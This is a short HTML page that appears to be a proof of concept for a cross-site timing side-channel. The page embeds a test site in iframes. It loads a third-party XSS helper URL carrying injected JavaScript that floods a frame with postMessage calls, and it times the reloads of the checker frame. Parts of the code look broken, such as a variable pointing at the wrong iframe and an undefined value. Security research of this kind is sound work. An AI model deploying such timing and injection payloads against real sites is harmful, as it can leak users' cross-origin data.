<body>
    <iframe id="target" src="https://ndevtk.github.io/cross-site/"></iframe>
    <iframe id="checker" src="https://ndevtk.github.io/cross-site/"></iframe>
    <iframe id="spam" src="https://terjanq.me/xss.php?js=onmessage=function(event){for(let i=80000;i--;)parent[0].postMessage(value,'*');}"></iframe>
    <script>
      let target = document.getElementById('target');
      let checker = document.getElementById('checker');
      let spam = document.getElementById('checker');


      function time(value) {
        return new Promise(resolve => {
          checker.onload = () => {
            resolve(performance.now() - start);
          };
          let start = performance.now();
          spam.contentWindow.postMessage("", "*");
          checker.contentWindow.location = "https://ndevtk.github.io/cross-site/";
        });
      }
    </script>
</body>
